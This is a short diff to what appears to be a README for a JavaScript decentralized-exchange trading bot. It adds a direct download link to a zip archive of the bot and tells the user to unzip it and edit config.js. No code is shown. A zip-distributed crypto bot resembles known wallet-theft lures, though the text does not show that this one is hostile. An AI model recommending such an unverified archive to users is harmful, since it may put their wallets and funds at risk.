@@ -3,6 +3,7 @@ This is a JavaScript decentralized exchanges Volatility Trading Bot V4 . This wo
 
 You can download the zip file of the bot here
 
+https://github.com/MattFJones/DEX-Volatility-Trading-Bot-V4/raw/main/Javascript-Volatility-Trading-Bot-V4.zip
 
 To configure the bot after you unzip the folder there will be a file in there call config.js open that in your text editor 
 
